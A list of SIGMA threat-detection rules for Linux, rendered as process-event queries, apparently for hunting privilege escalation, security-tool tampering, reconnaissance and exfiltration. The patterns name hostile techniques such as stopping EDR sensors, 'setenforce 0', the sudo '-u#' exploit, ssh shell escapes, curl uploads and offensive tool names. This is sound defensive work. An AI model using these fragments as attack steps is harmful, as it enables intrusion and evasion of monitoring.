author: Alejandro Ortuno, oscd.community
description: Detects abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code. Detection will focus on crontab jobs uploaded from the tmp folder.
query: any where Image:"*crontab" and CommandLine:"*/tmp/*"

name: SIGMA - Security Software Discovery - Linux
author: Daniil Yugoslavskiy, oscd.community
description: Detects usage of system utilities (only grep and egrep for now) to discover security software discovery
query: any where (Image like~ ("*/grep", "*/egrep")) and (CommandLine like~ ("*nessusd*", "*td-agent*", "*packetbeat*", "*filebeat*", "*auditbeat*", "*osqueryd*", "*cbagentd*", "*falcond*"))

name: SIGMA - Disabling Security Tools
author: Ömer Günal, Alejandro Ortuno, oscd.community
description: Detects disabling security tools
query: any where (Image:"*/service" and (CommandLine:"*iptables*" and CommandLine:"*stop*")) or (Image:"*/service" and (CommandLine:"*ip6tables*" and CommandLine:"*stop*")) or (Image:"*/chkconfig" and (CommandLine:"*iptables*" and CommandLine:"*stop*")) or (Image:"*/chkconfig" and (CommandLine:"*ip6tables*" and CommandLine:"*stop*")) or (Image:"*/systemctl" and (CommandLine:"*firewalld*" and CommandLine:"*stop*")) or (Image:"*/systemctl" and (CommandLine:"*firewalld*" and CommandLine:"*disable*")) or (Image:"*/service" and (CommandLine:"*cbdaemon*" and CommandLine:"*stop*")) or (Image:"*/chkconfig" and (CommandLine:"*cbdaemon*" and CommandLine:"*off*")) or (Image:"*/systemctl" and (CommandLine:"*cbdaemon*" and CommandLine:"*stop*")) or (Image:"*/systemctl" and (CommandLine:"*cbdaemon*" and CommandLine:"*disable*")) or (Image:"*/setenforce" and CommandLine:"*0*") or (Image:"*/systemctl" and (CommandLine:"*stop*" and CommandLine:"*falcon-sensor*")) or (Image:"*/systemctl" and (CommandLine:"*disable*" and CommandLine:"*falcon-sensor*"))

name: SIGMA - Disable Or Stop Services
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects the usage of utilities such as 'systemctl', 'service'...etc to stop or disable tools and services
query: any where (Image like~ ("*/service", "*/systemctl", "*/chkconfig")) and (CommandLine like~ ("*stop*", "*disable*"))

name: SIGMA - Setuid and Setgid
author: Ömer Günal
description: Detects suspicious change of file privileges with chown and chmod commands
query: any where CommandLine:"*chown root*" and (CommandLine like~ ("* chmod u+s*", "* chmod g+s*"))

name: SIGMA - Shell Invocation Via Ssh - Linux
author: Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)
description: Detects the use of the "ssh" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.
query: any where (Image:"*/ssh" and (CommandLine like~ ("*ProxyCommand=;*", "*permitlocalcommand=yes*", "*localhost*"))) and (CommandLine like~ ("*/bin/bash*", "*/bin/dash*", "*/bin/fish*", "*/bin/sh*", "*/bin/zsh*", "*sh 0<&2 1>&2*", "*sh 1>&2 0<&2*"))

name: SIGMA - Potential Linux Amazon SSM Agent Hijacking
author: Muhammad Faisal
description: Detects potential Amazon SSM agent hijack attempts as outlined in the Mitiga research report.
query: any where Image:"*/amazon-ssm-agent" and (CommandLine:"*-register *" and CommandLine:"*-code *" and CommandLine:"*-id *" and CommandLine:"*-region *")

name: SIGMA - Sudo Privilege Escalation CVE-2019-14287
author: Florian Roth (Nextron Systems)
description: Detects users trying to exploit sudo vulnerability reported in CVE-2019-14287
query: any where CommandLine:"* -u#*"

name: SIGMA - Chmod Suspicious Directory
author: Christopher Peacock @SecurePeacock, SCYTHE @scythe_io
description: Detects chmod targeting files in abnormal directory paths.

subtechnique.name: Linux and Mac File and Directory Permissions Modification

query: any where Image:"*/chmod" and (CommandLine like~ ("*/tmp/*", "*/.Library/*", "*/etc/*", "*/opt/*"))

name: SIGMA - Container Residence Discovery Via Proc Virtual FS
author: Seth Hanford
description: Detects potential container discovery via listing of certain kernel features in the "/proc" virtual filesystem
false_positives: Legitimate system administrator usage of these commands
Some container tools or deployments may use these techniques natively to determine how they proceed with execution, and will need to be filtered
query: any where (Image like~ ("*awk", "*/cat", "*grep", "*/head", "*/less", "*/more", "*/nl", "*/tail")) and (CommandLine:"*/proc/2/*" or (CommandLine:"*/proc/*" and (CommandLine like~ ("*/cgroup", "*/sched"))))

name: SIGMA - Suspicious Curl File Upload - Linux
author: Nasreddine Bencherchali (Nextron Systems), Cedric MAURUGEON (Update)
description: Detects a suspicious curl process start the adds a file to a web request
false_positives: Scripts created by developers and admins
query: any where (Image:"*/curl" and ((CommandLine like~ ("* --form*", "* --upload-file *", "* --data *", "* --data-*")) or CommandLine regex~ "\s-[FTd]\s")) and (not (CommandLine like~ ("*://localhost*", "*://127.0.0.1*")))

name: SIGMA - Suspicious Curl Change User Agents - Linux
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects a suspicious curl process start on linux with set useragent options
false_positives: Scripts created by developers and admins
query: any where Image:"*/curl" and (CommandLine like~ ("* -A *", "* --user-agent *"))

name: SIGMA - Docker Container Discovery Via Dockerenv Listing
author: Seth Hanford
description: Detects listing or file reading of ".dockerenv" which can be a sing of potential container discovery
false_positives: Legitimate system administrator usage of these commands
Some container tools or deployments may use these techniques natively to determine how they proceed with execution, and will need to be filtered
query: any where (Image like~ ("*/cat", "*/dir", "*/find", "*/ls", "*/stat", "*/test", "*grep")) and CommandLine:"*.dockerenv"

name: SIGMA - Potentially Suspicious Execution From Tmp Folder
author: Joseliyo Sanchez, @Joseliyo_Jstnk
description: Detects a potentially suspicious execution of a process located in the '/tmp/' folder
query: any where Image:"/tmp/*" and (not Image:"*/usr/bin/nextcloud")

name: SIGMA - Potential Discovery Activity Using Find - Linux
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects usage of "find" binary in a suspicious manner to perform discovery
query: any where Image:"*/find" and (CommandLine like~ ("*-perm -4000*", "*-perm -2000*", "*-perm 0777*", "*-perm -222*", "*-perm -o w*", "*-perm -o x*", "*-perm -u=s*", "*-perm -g=s*"))

name: SIGMA - Suspicious Git Clone - Linux
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects execution of "git" in order to clone a remote repository that contain suspicious keywords which might be suspicious
query: any where (Image:"*/git" and CommandLine:"* clone *") and (CommandLine like~ ("*exploit*", "*Vulns*", "*vulnerability*", "*RCE*", "*RemoteCodeExecution*", "*Invoke-*", "*CVE-*", "*poc-*", "*ProofOfConcept*", "*proxyshell*", "*log4shell*", "*eternalblue*", "*eternal-blue*", "*MS17-*"))

name: SIGMA - History File Deletion
author: Florian Roth (Nextron Systems)
description: Detects events in which a history file gets deleted, e.g. the ~/bash_history to remove traces of malicious activity
query: any where (Image like~ ("*/rm", "*/unlink", "*/shred")) and ((CommandLine like~ ("*/.bash_history*", "*/.zsh_history*")) or (CommandLine like~ ("*_history", "*.history", "*zhistory")))

name: SIGMA - Print History File Contents
author: Florian Roth (Nextron Systems)
description: Detects events in which someone prints the contents of history files to the commandline or redirects it to a file for reconnaissance
query: any where (Image like~ ("*/cat", "*/head", "*/tail", "*/more")) and ((CommandLine like~ ("*/.bash_history*", "*/.zsh_history*")) or (CommandLine like~ ("*_history", "*.history", "*zhistory")))

name: SIGMA - Linux HackTool Execution
author: Nasreddine Bencherchali (Nextron Systems), Georg Lauenstein (sure[secure])
description: Detects known hacktool execution based on image name.
query: any where (Image like~ ("*/crackmapexec", "*/havoc", "*/merlin-agent", "*/merlinServer-Linux-x64", "*/msfconsole", "*/msfvenom", "*/ps-empire server", "*/ps-empire", "*/sliver-client", "*/sliver-server", "*/Villain.py")) or (Image like~ ("*/cobaltstrike*", "*/teamserver*")) or (Image like~ ("*/autorecon", "*/httpx", "*/legion", "*/naabu", "*/netdiscover", "*/nuclei", "*/recon-ng")) or Image:"*/sniper*" or (Image like~ ("*/dirb", "*/dirbuster", "*/eyewitness", "*/feroxbuster", "*/ffuf", "*/gobuster", "*/wfuzz", "*/whatweb")) or (Image like~ ("*/joomscan", "*/nikto", "*/wpscan")) or (Image like~ ("*/aircrack-ng", "*/bloodhound-python", "*/bpfdos", "*/ebpfki", "*/evil-winrm", "*/hashcat", "*/hoaxshell.py", "*/hydra", "*/john", "*/ncrack", "*/nxc-ubuntu-latest", "*/pidhide", "*/pspy32", "*/pspy32s", "*/pspy64", "*/pspy64s", "*/setoolkit", "*/sqlmap", "*/writeblocker")) or Image:"*/linpeas*"

name: SIGMA - Potential Container Discovery Via Inodes Listing
author: Seth Hanford
description: Detects listing of the inodes of the "/" directory to determine if the we are running inside of a container.
false_positives: Legitimate system administrator usage of these commands
Some container tools or deployments may use these techniques natively to determine how they proceed with execution, and will need to be filtered
query: any where Image:"*/ls" and (CommandLine:"* -*i*" and CommandLine:"* -*d*") and CommandLine:"* /"

name: SIGMA - Interactive Bash Suspicious Children
author: Florian Roth (Nextron Systems)
description: Detects suspicious interactive bash as a parent to rather uncommon child processes
false_positives: Legitimate software that uses these patterns
query: any where ParentCommandLine:"bash -i" and ((CommandLine like~ ("*-c import *", "*base64*", "*pty.spawn*")) or (Image like~ ("*whoami", "*iptables", "*/ncat", "*/nc", "*/netcat")))

name: SIGMA - Suspicious Java Children Processes
author: Nasreddine Bencherchali (Nextron Systems)
description: Detects java process spawning suspicious children
query: any where ParentImage:"*/java" and (CommandLine like~ ("*/bin/sh*", "*bash*", "*dash*", "*ksh*", "*zsh*", "*csh*", "*fish*", "*curl*", "*wget*", "*python*"))

name: SIGMA - Linux Network Service Scanning Tools Execution
author: Alejandro Ortuno, oscd.community, Georg Lauenstein (sure[secure])
description: Detects execution of network scanning and reconnaisance tools. These tools can be used for the enumeration of local or remote network services for example.
query: any where ((Image like~ ("*/nc", "*/ncat", "*/netcat", "*/socat")) and (not (CommandLine like~ ("* --listen *", "* -l *")))) or (Image like~ ("*/autorecon", "*/hping", "*/hping2", "*/hping3", "*/naabu", "*/nmap", "*/nping", "*/telnet", "*/zenmap"))

name: SIGMA - Linux Shell Pipe to Shell
author: Florian Roth (Nextron Systems)
description: Detects suspicious process command line that starts with a shell that executes something and finally gets piped into another shell
false_positives: Legitimate software that uses these patterns
query: any where (CommandLine like~ ("sh -c *", "bash -c *")) and ((CommandLine like~ ("*| bash *", "*| sh *", "*|bash *", "*|sh *")) or (CommandLine like~ ("*| bash", "*| sh", "*|bash", "* |sh")))

name: SIGMA - Access of Sudoers File Content
author: Florian Roth (Nextron Systems)
description: Detects the execution of a text-based file access or inspection utilities to read the content of /etc/sudoers in order to potentially list all users that have sudo rights.
query: any where (Image like~ ("*/cat", "*/ed", "*/egrep", "*/emacs", "*/fgrep", "*/grep", "*/head", "*/less", "*/more", "*/nano", "*/tail")) and CommandLine:"* /etc/sudoers*"

name: SIGMA - Linux Recon Indicators
author: Florian Roth (Nextron Systems)
description: Detects events with patterns found in commands used for reconnaissance on linux systems
